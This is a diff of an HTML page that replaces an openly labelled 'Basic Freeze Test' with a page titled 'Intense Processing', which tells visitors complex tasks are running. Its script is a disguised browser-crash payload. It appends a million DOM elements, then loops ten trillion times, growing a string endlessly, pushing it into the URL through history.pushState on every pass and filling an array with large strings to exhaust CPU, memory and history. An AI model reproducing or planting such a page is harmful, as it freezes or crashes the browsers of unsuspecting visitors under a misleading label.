@@ -1,35 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Basic Freeze Test</title>
-    <meta charset="UTF-8">
+    <title>Intense Processing</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background-color: #f0f0f0; }
-        h1 { color: #cc0000; }
+        body {
+            font-family: sans-serif;
+            margin: 40px;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
     </style>
 </head>
 <body>
 
-    <h1>Initiating Basic Freeze...</h1>
-    <p>If you see this, the page loaded. The script below will now attempt to freeze this tab.</p>
+    <h1>Performing Intense Operations...</h1>
+    <p>This page is executing complex tasks. Please wait.</p>
 
     <script>
-        // Log a message right before the freeze attempt
-        console.log("Attempting to enter infinite while(true) loop...");
+    var total = "";
+    var memoryHog = [];
+    var body = document.body;
 
-        // The core infinite loop
-        while (true) {
-            // This loop will run indefinitely, consuming 100% CPU
-            // on the main thread and preventing any further interaction
-            // or rendering updates in this tab.
-        }
+    // Attempt to stress DOM creation and appending
+    // Creating a large number of elements can consume significant memory and rendering resources
+    // Adjust the loop count as needed - 1 million is often enough to cause issues
+    for (var i = 0; i < 1000000; i++) {
+        var div = document.createElement('div');
+        // Optionally add content or style to make elements heavier
+        // div.style.height = '1px';
+        // div.style.width = '1px';
+        // div.textContent = i;
+        body.appendChild(div);
+    }
 
-        // This line is unreachable
-        console.log("ERROR: Exited infinite loop!");
+    // Stress CPU, String Memory, History API, and Array Memory
+    // This loop runs 10 trillion times and performs multiple resource-intensive operations
+    for( var i = 0; i < 10000000000000; i++ ) {
+      // String concatenation - grows the 'total' string indefinitely
+      total += i.toString();
+
+      // History push - attempts to add a new state and change the URL in every iteration
+      // This consumes history memory and stresses the history API
+      history.pushState(0, 0, total );
+
+      // Memory allocation - push large strings to an array
+      // This consumes heap memory. Doing it every iteration is too much, so do it less often.
+      if (i % 100000 === 0) { // Push every 100,000 iterations (still 100 million pushes)
+           memoryHog.push(new Array(1000).join('X') + i); // Push a large string
+      }
+
+      // Note: Adding DOM manipulation inside this massive loop is generally not feasible
+      // as creating/appending 10^13 elements is impossible. The initial DOM loop handles that stress.
+    }
+
+    console.log("Operations complete."); // This message is highly unlikely to be reached
+
     </script>
 
-    <!-- This paragraph will likely not render if the script above executes successfully -->
-    <p>If you can read this second paragraph, the script likely failed or was blocked.</p>
+    <p>If this message is visible, the operations may have finished or encountered an issue.</p>
 
 </body>
 </html>
